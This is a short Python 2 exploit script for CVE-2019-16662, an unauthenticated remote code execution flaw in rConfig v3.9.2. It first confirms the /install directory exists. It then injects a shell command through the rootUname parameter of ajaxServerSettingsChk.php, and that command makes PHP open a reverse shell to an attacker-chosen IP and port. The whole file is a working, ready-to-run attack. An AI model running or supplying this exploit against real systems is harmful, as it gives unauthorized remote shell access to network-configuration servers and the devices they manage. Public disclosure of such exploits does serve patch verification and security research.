#!/usr/bin/python

# Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution
# Date: 18/09/2019
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2019-16662
# Vendor Homepage: https://rconfig.com/
# Software link: https://rconfig.com/download
# Version: v3.9.2
# Tested on: CentOS 7.7 / PHP 7.2.22

import requests
import sys
from urllib import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 4:
    print "[+] Usage : ./exploit.py target ip port"
    exit()

target = sys.argv[1]

ip = sys.argv[2]

port = sys.argv[3]

payload = quote(''';php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'#'''.format(ip, port))

install_path = target + "/install"

req = requests.get(install_path, verify=False)
if req.status_code == 404:
    print "[-] Installation directory not found!"
    print "[-] Exploitation failed !"
    exit()
elif req.status_code == 200:
    print "[+] Installation directory found!"
url_to_send = target + "/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=" + payload

print "[+] Triggering the payload"
print "[+] Check your listener !"

requests.get(url_to_send, verify=False)
